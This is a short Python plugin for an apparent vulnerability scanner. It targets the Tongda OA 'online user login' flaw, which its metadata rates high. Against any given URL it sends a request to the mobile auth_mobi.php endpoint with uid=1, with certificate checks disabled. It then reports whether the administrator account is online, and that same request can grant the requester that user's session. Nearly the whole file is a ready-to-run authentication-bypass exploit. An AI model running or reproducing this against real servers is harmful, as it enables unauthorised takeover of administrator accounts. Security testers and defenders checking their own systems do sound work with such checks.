#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '通达OA在线用户登录',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200:
      pass
    else:
      return ret
    if "RELOGIN" in res.text:
      ret['huixian'] = '目标用户处于下线状态'
      ret['ifbug'] = True
      res.close()
      return ret
    elif re.search(r'loginUser.*?uid:1.*?user_id.*?user_name.*?', res.text,re.S):
      ret['huixian'] = '目标用户处于在线状态'
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret